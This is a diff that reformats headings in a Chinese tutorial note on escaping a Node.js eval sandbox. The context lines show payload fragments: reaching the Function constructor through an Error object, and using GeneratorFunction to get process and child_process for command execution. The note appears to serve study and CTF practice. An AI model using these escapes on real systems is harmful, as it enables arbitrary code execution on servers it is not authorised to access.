@@ -184,7 +184,7 @@ app.post('/eval', (req, res) => {
 
 #### 逃逸：
 
-1. 尝试 arguments.callee.caller
+##### 1. 尝试 arguments.callee.caller
     
 
 ```json
@@ -208,7 +208,7 @@ app.post('/eval', (req, res) => {
 
 沙箱的实现方式必须是：用一个真实的 JavaScript 函数来调用你的代码。如果沙箱的执行引擎是 Node.js 底层的 C++ 代码，那么 `.caller`可能指向一个不存在或无法访问的内部函数。
 
-2. 利用异常对象（Error Object）
+##### 2. 利用异常对象（Error Object）
     
 
 ```javascript
@@ -217,7 +217,7 @@ try { throw new Error('test') } catch(e) { return e.constructor.constructor('ret
 
 主动抛出错误获得错误对象，他不是一个纯净对象，所以存在原型链
 
-3. 利用 GeneratorFunction（了解）
+##### 3. 利用 GeneratorFunction（了解）
     
 
 ```javascript
@@ -238,7 +238,7 @@ new GeneratorFunction('return process')().mainModule.require('child_process').ex
     - `new GeneratorFunction('return process')()`：用这个构造函数创建一个返回 `process`的函数并立即执行。
         
 
-#### 利用 Proxy 对象（终极想象）
+#####  4. 利用 Proxy 对象（终极想象）
 
 Payload:
 
